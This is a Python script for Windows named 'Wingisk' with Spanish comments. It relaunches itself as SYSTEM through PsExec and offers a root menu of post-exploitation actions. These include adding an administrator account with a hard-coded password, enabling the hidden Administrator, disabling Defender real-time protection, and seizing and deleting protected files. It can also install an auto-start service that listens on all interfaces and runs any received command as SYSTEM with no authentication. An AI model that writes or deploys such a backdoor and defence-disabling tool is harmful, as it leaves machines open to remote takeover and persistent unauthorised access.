import os
import ctypes
import subprocess
import sys
import getpass
import winreg as reg
import signal
import atexit
import socket
import threading

# -------------------------------------------------------------------
# Configuración de la API y del servicio
API_HOST     = "0.0.0.0"
API_PORT     = 15090
SERVICE_NAME = "WingiskAPI"
SERVICE_CMD  = r'C:\Windows\System32\wingiskmanager.exe --api'
# -------------------------------------------------------------------

def is_system():
    return getpass.getuser().lower() == "system"

def elevate_to_system():
    """Relanza este script como SYSTEM usando PsExec."""
    args = ["psexec64", "-i", "-s", sys.executable] + sys.argv
    print(f"[*] Elevando a SYSTEM: {' '.join(args)}")
    subprocess.run(args, shell=False)
    sys.exit()

def check_registry():
    """Lee HKCU\SOFTWARE\Wingisk:Open (REG_DWORD)."""
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"SOFTWARE\Wingisk", 0, reg.KEY_READ)
        value, _ = reg.QueryValueEx(key, "Open")
        reg.CloseKey(key)
        return int(value)
    except FileNotFoundError:
        return None

def set_registry(value):
    """Escribe HKCU\SOFTWARE\Wingisk:Open (REG_DWORD)."""
    key = reg.CreateKey(reg.HKEY_CURRENT_USER, r"SOFTWARE\Wingisk")
    reg.SetValueEx(key, "Open", 0, reg.REG_DWORD, int(value))
    reg.CloseKey(key)

def install_service():
    """Crea e inicia el servicio WingiskAPI bajo SYSTEM."""
    print(f"[*] Instalando servicio {SERVICE_NAME}...")
    os.system(f'sc create {SERVICE_NAME} binPath= "{SERVICE_CMD}" start=auto type=own')
    os.system(f'sc description {SERVICE_NAME} "Wingisk API Server running as SYSTEM"')
    os.system(f'sc start {SERVICE_NAME}')
    print(f"[+] Servicio {SERVICE_NAME} instalado y arrancado.")

def create_wingisk_user():
    print("[*] Creando usuario wingisk en Administrators...")
    os.system("net user wingisk Wingisk@2025 /add")
    os.system("net localgroup Administrators wingisk /add")
    print("[+] Usuario wingisk creado.")

# --- Servidor API por sockets ---

def handle_client(conn, addr):
    cmd = conn.recv(4096).decode().strip()
    if cmd:
        print(f"[*] {addr} → ejecutando: {cmd}")
        try:
            subprocess.Popen(cmd, shell=True)
            conn.sendall(b"OK\n")
        except Exception as e:
            conn.sendall(f"ERROR: {e}\n".encode())
    conn.close()

def api_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((API_HOST, API_PORT))
    s.listen(5)
    print(f"[*] API Server escuchando en {API_HOST}:{API_PORT} como SYSTEM...")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

# --- Menú Root under SYSTEM ---

def root_menu():
    while True:
        print("""
🚀 WINGISK - Root Menu (SYSTEM)
1. Listar procesos
2. Mostrar usuarios
3. Shell CMD
4. Activar Admin oculta
5. Desactivar Defender
6. Tomar control de ruta
7. Eliminar protegidos
8. Shell PowerShell
9. Crear usuario Wingisk
10. Salir
11. Instalar Servicio API como SYSTEM
""")
        opt = input(">> ").strip()
        if opt=="1":    os.system("tasklist")
        elif opt=="2":  os.system("net user")
        elif opt=="3":  os.system("cmd")
        elif opt=="4":  os.system("net user Administrator /active:yes")
        elif opt=="5":  os.system("powershell Set-MpPreference -DisableRealtimeMonitoring $true")
        elif opt=="6":
            p=input("Ruta: ").strip()
            os.system(f'takeown /f "{p}" /a /r /d y')
            os.system(f'icacls "{p}" /grant Administrators:F /t')
        elif opt=="7":
            p=input("Ruta: ").strip()
            os.system(f'takeown /f "{p}" /a /r /d y')
            os.system(f'icacls "{p}" /grant Administrators:F /t')
            os.system(f'rmdir /s /q "{p}"' if os.path.isdir(p) else f'del /f /q "{p}"')
        elif opt=="8":  os.system("powershell")
        elif opt=="9":  create_wingisk_user()
        elif opt=="10": break
        elif opt=="11": install_service()
        else: print("Opción inválida.")

def cleanup():
    print("[*] Salida: restableciendo registro a 0")
    set_registry(0)

# --- Punto de entrada ---

if __name__=="__main__":
    atexit.register(cleanup)
    signal.signal(signal.SIGINT, lambda s,f: (cleanup(), sys.exit(0)))

    reg_val = check_registry()

    # Si no somos SYSTEM y no hemos puesto el flag, marcamos y elevamos
    if not is_system() and reg_val != 1:
        set_registry(1)
        elevate_to_system()

    # Aquí ya somos SYSTEM
    # Limpiamos flag si venimos de elevación
    if reg_val == 1:
        set_registry(0)

    # Decisión de API vs menú
    if "--api" in sys.argv:
        api_server()
    else:
        root_menu()
